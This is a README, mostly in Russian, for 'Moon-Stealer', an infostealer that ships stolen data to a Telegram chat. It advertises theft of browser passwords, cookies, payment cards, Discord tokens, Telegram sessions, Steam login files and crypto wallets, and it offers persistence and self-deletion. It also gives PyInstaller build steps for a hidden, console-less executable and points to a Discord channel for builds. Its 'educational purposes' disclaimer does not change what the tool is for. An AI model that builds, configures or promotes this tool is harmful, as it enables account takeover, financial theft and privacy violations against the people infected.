# Moon-Stealer
EN - 🌙 Advanced Telegram-Integrated Stealer | Passwords, Cookies, Discord tokens, Telegram sessions, Steam Guard bypass
<h2 align="center">⚠️ DISCLAIMER ⚠️</h2>

> **Этот проект создан исключительно в образовательных и исследовательских целях для демонстрации уязвимостей компьютерных систем и повышения осведомлённости в области кибербезопасности. Использование допускается ТОЛЬКО в контролируемых средах с явного разрешения владельца системы. Любое неправомерное применение строго запрещено. Разработчик не несёт ответственности за любой ущерб, вред или юридические последствия, возникшие в результате использования или нецелевого применения данного ПО. Загружая или используя Moon Stealer, вы подтверждаете, что осознаёте потенциальные риски и принимаете на себя полную ответственность за все совершаемые действия.**

---

<h2 align="center">📢 ОБНОВЛЕНИЯ И ПОДДЕРЖКА</h2><p align="center"> <a href="https://discord.gg/S8jKrv9Zc"><img src="https://img.shields.io/badge/Discord%20Server-Присоединиться-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord Server"></a> <br> <sub>Ранние обновления, эксклюзивные сборки, обсуждения</sub> </p><p align="center"> <b>📩 Связь со мной:</b> Discord: <code>@qenivails</code> </p>

---

<h2 align="center">🚀 ВОЗМОЖНОСТИ</h2>

### 🔐 Браузеры (16+)
- ✅ **Извлечение сохранённых паролей** из всех Chromium-браузеров (Chrome, Edge, Opera, OperaGX, Brave, Yandex, Vivaldi, Chromium, Epic, Amigo, Torch, Comodo Dragon, 360 Browser, Maxthon, QQ Browser, Sogou)
- ✅ **Сбор Cookies** и конвертация в Netscape-формат для мгновенного импорта
- ✅ **Платёжные карты** (номер, имя, срок) — расшифровка на лету
- ✅ **Пользовательские токены и сессионные данные** из Cookies
- ✅ **Firefox** — logins.json, key4.db, cookies.sqlite

### 💬 Мессенджеры и Игры
- ✅ **Discord токены** — десктопные клиенты (Discord, PTB, Canary, Development) + все вышеперечисленные браузеры
- ✅ **Telegram сессия** (папка tdata) с принудительным завершением процесса Telegram, трёхуровневое копирование — гарантированный сбор
- ✅ **Steam Guard bypass** — извлечение ssfn* и config.vdf для безусловного входа без пароля и 2FA

### 💰 Криптокошельки
- ✅ Exodus, Atomic, Electrum
- ✅ MetaMask, Phantom (браузерные расширения)

### 🖥️ Система
- ✅ Хостнейм, локальный и публичный IP
- ✅ ОС, CPU, GPU, RAM
- ✅ Скриншот всех мониторов

### 📁 Файлы
- ✅ Сбор файлов (txt, docx, xlsx, pdf, py, cpp, zip, jpg, png, kdbx, wallet) с рабочего стола, документов и загрузок

### 🧹 Самоочистка
- ✅ Удаление временных файлов и самого EXE после отправки
- ✅ Persistence (автозагрузка) и последующая очистка

---

<h2 align="center">📤 ФОРМАТ ОТПРАВКИ</h2>
Все данные упаковываются в отдельные ZIP-архивы и отправляются в ваш Telegram-чат:

discord_tokens.txt | Discord токены
browsers_creds_*.zip | Пароли, куки, карты, токены
steam_*.zip | SSFN + config.vdf + инструкция
telegram_tdata_*.zip | Полная папка tdata
system_*.zip | system.txt + скриншот
wallets_*.zip | Данные кошельков

И МНОГОЕ ДРУГОЕ!

<h2 align="center">🔧 КАСТОМИЗАЦИЯ</h2>
Telegram Token / Chat ID → переменные TELEGRAM_TOKEN и CHAT_ID

Максимальный размер файла → MAX_FILE_SIZE (по умолчанию 49 МБ)

Расширения собираемых файлов → список exts в grab_files()

Иконка EXE → флаг --icon=icon.ico при сборке

Имя выходного файла → --name MoonStealer
---


<h2 align="center">🛠️ СБОРКА</h2>

1. **Установите зависимости** (PowerShell от администратора):
   ```powershell
   pip install pycryptodome pywin32 requests pillow pyinstaller
2.Подготовьте иконку (опционально) — файл .ico (256x256)
3.Скомпилируйте одним файлом без консоли:
python -m PyInstaller --onefile --noconsole --icon=icon.ico --name MoonStealer stealer.py
4.EXE появится в папке dist

---

<h2 align="center">📢 ОБНОВЛЕНИЯ И ПОДДЕРЖКА</h2><p align="center"> <a href="https://discord.gg/S8jKrv9Zc"><img src="https://img.shields.io/badge/Discord%20Server-Присоединиться-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord Server"></a> <br> <sub>Ранние обновления, эксклюзивные сборки, обсуждения</sub> </p><p align="center"> <b>📩 Связь со мной:</b> Discord: <code>@qenivails</code> </p>
